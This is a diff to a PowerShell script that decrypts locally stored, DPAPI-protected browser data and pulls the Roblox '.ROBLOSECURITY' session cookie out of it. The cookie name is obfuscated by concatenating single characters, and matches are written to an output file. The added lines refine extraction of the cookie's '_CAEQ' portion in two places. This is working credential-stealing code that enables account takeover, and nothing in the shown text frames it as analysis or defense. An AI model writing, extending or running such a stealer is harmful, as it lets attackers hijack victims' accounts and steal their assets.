@@ -94,7 +94,10 @@ foreach($p2 in $rp0){
             $c1=[Text.Encoding]::UTF8.GetString($d1)
             # Netscape format: name<TAB>value — use TAB not =
             if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n\t]+)'){
-                Add-Content $f0 "$tR|$($Matches[1])"
+                $ck=$Matches[1]
+                # Extract _CAEQ part if present (short format)
+                if($ck -match '(_'+'CAEQ[^\s]+)'){$ck=$Matches[1]}
+                Add-Content $f0 "$tR|$ck"
             }elseif($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s+([^\r\n\t]+)'){
                 Add-Content $f0 "$tR|$($Matches[1])"
             }else{
@@ -122,7 +125,9 @@ if(Test-Path $p3){
                 $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $c2=[Text.Encoding]::UTF8.GetString($d2)
                 if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n\t]+)'){
-                    Add-Content $f0 "$tRM|$($Matches[1])"
+                    $ck=$Matches[1]
+                    if($ck -match '(_'+'CAEQ[^\s]+)'){$ck=$Matches[1]}
+                    Add-Content $f0 "$tRM|$ck"
                 }elseif($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s+([^\r\n\t]+)'){
                     Add-Content $f0 "$tRM|$($Matches[1])"
                 }else{
